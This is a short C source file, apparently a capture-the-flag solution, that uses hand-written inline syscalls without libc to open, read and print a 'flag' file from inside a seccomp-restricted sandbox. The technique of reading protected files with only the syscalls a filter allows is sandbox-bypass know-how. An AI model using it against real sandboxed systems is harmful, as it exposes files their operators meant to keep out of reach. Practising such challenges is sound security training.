// sploit2.c
// Minimal exploit for sandbox2 that opens "flag", reads its contents,
// and outputs them to stdout using only allowed syscalls.
// Allowed syscalls (from seccomp dump):
//   open, read, write, close, exit_group, among others.
// Compile with: gcc -static -nostdlib -o sploit2 sploit2.c

#include <sys/syscall.h>
#include <sys/types.h>

// Custom inline syscall wrapper for x86_64.
// It passes up to six arguments using the proper registers.
static inline long my_syscall(long num, long a1, long a2, long a3,
                              long a4, long a5, long a6) {
    register long r10 asm("r10") = a4;
    register long r8  asm("r8")  = a5;
    register long r9  asm("r9")  = a6;
    long ret;
    __asm__ volatile (
         "syscall"
         : "=a" (ret)
         : "a" (num), "D" (a1), "S" (a2), "d" (a3),
           "r" (r10), "r" (r8), "r" (r9)
         : "rcx", "r11", "memory"
    );
    return ret;
}

// Minimal _start entry point. No libc initialization happens.
void _start(void) {
    long fd, n;
    char buf[1024];

    // Open the flag file using the legacy open syscall.
    // SYS_open is allowed per seccomp dump (syscall number 2).
    fd = my_syscall(SYS_open, (long)"flag", 0 /* O_RDONLY */, 0, 0, 0, 0);
    if (fd < 0) {
        my_syscall(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }

    // Read up to 1024 bytes from the flag file.
    n = my_syscall(SYS_read, fd, (long)buf, sizeof(buf), 0, 0, 0);

    // If some data was read, write it to stdout (fd 1).
    if (n > 0) {
        my_syscall(SYS_write, 1, (long)buf, n, 0, 0, 0);
    }

    // Close the flag file.
    my_syscall(SYS_close, fd, 0, 0, 0, 0, 0);

    // Exit cleanly using exit_group (allowed by seccomp).
    my_syscall(SYS_exit_group, 0, 0, 0, 0, 0, 0);
}